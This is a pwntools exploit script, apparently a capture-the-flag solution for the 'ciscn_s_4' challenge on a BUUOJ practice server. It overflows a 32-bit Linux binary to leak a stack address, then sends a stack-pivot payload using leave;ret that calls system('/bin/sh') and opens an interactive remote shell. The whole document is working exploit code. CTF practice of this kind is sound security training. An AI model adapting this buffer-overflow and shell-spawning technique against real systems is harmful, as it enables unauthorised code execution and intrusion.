from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('ciscn_s_4')
io = remote('node4.buuoj.cn', 25563)
elf = ELF('ciscn_s_4')
system_plt = elf.plt['system']
leave_ret = 0x080484b8

payload = cyclic(0x28)
io.sendafter('Welcome, my friend. What\'s your name?\n', payload)
io.recvuntil(payload)
buf = u32(io.recvn(4)) - 0x38
log.success('buf: ' + hex(buf))

bin_sh = buf + 0x10
payload = cyclic(4) + p32(system_plt) + cyclic(4) + p32(bin_sh) + b'/bin/sh\x00' + cyclic(0x10) + p32(buf) + p32(leave_ret)
io.send(payload)
io.interactive()

